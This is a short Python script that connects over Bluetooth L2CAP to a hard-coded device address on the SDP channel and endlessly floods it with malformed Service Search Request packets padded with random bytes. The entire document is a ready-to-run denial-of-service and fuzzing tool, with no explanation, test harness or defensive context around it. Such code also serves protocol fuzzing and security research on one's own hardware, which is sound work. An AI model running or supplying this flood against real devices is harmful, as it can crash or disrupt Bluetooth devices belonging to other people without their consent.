import bluetooth
import os
import time
import random
import struct

target_mac = "41:42:8A:74:E6:BC"
psm = 0x0001  # SDP PSM
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
sock.connect((target_mac, psm))

print("Starting malformed SDP flood...")

try:
    while True:
        tid = random.randint(0, 0xFFFF)
        payload = struct.pack(">BH", 0x02, tid) + os.urandom(random.randint(10, 100))  # 0x02 = SDP Service Search Request
        sock.send(payload)
        time.sleep(0.01)
except KeyboardInterrupt:
    print("Stopped.")
finally:
    sock.close()
